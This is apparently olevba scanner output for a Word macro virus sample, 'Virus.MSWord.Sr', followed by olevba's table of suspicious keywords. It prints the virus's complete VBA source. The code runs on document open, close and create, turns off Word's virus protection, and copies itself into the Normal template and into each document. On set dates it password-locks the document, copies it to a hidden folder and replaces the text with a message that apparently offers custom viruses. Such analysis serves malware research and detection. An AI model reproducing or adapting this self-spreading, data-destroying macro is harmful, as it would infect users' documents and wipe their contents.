olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sr-ebad9093c6a4e88b79bbddb32bed327a997c1d44
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sr-ebad9093c6a4e88b79bbddb32bed327a997c1d44 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sr.bas 
in file: Virus.MSWord.Sr-ebad9093c6a4e88b79bbddb32bed327a997c1d44 - OLE stream: 'Macros/VBA/Sr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Stp()
 On Error Resume Next
  zz = Word.ActiveDocument.FullName
  ee = Normal.ThisDocument.FullName
  

  Application.OrganizerCopy Source:=ee, _
      Destination:=zz, name:="Sr", _
      Object:=3
      
  Application.OrganizerCopy Source:=zz, _
      Destination:=ee, name:="Sr", _
      Object:=3
      
    Word.NormalTemplate.Save
End Sub
Sub AutoNew()

Word.Options.VirusProtection = False
ActiveDocument.Saved = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.Caption = "T" + ""
End Sub
Sub AutoOpen()
Word.Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ActiveDocument.Saved = False
Application.Caption = "T" + ""
Stp
End Sub
Sub AutoClose()
Word.Options.VirusProtection = False
Application.Caption = "TMicrosoft Word"
Stp
df = Word.ActiveDocument.FullName
qq = DateTime.Date
Drr = Word.Application.Path + "\" + "dc"
If (Dir(Drr, vbDirectory) = "") Then MkDir (Drr)
Pat = Word.Application.Path + "\" + "dc" + "\" + ActiveDocument.name
    If qq = "25.06.01" Or qq = "26.06.01" Or qq = "27.06.01" Or qq = "28.06.01" Or qq = "29.06.01" Or qq = "30.06.01" Then
    Application.ActiveDocument.Password = "agl"
    ActiveDocument.Saved = False
    If ActiveDocument.Content.Find.Execute(FindText:="Hi.") = False Then
    ActiveDocument.SaveAs (Pat)
    Word.RecentFiles.Item(1).Delete
    End If
    ActiveDocument.Select
    Selection.Delete
    Selection.TypeText ("Hi.")
    Selection.TypeParagraph
    Selection.TypeText ("Äàííûé âèðóñ, ýòî ìîé ïåðâèé âèðóñ, ïîêà ÿ òîëüêó ó÷óñü, îòâåò íà âîïðîñ: êàê âîñòàíîâèòü ñâîè äàííûå âû, ïîêà åùå, ñìîæåòå ïîëó÷èòü íàïèñàâ ìíå.")
    Selection.TypeParagraph
    Selection.TypeText (" Ìîé àäðåñ treon9875@rambler.ru . Äî âñòðå÷è! Êîìó íóæåí ñïåöèàëèçèðîâàííûé âèðóñ ïèøèòå, âñåãäà ðàä ïîìî÷ü")
    Selection.TypeParagraph
    Word.ActiveWindow.WindowState = wdWindowStateNormal
    Word.ActiveWindow.Width = 10
    End If
    Application.ActiveDocument.Password = ""
    ActiveDocument.Saved = False
    If Word.ActiveDocument.Path = "" Then
    ActiveDocument.Saved = True
    ActiveDocument.Saved = False
    Else: ActiveDocument.SaveAs (df)
    End If
Application.Caption = ""
End Sub

'Sub viewvbcode()
'MsgBox ("Ýòà âîçìîæíîñòü çàáëîêèðîâàíà")
'uf.Show
'If a <> "ñåìüÿ" Then MsgBox ("Ïàðîëü íå âåðåí") Else Word.WordBasic.AppActivate ("ïàðîëü ââåäåí")

'End Sub

 



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

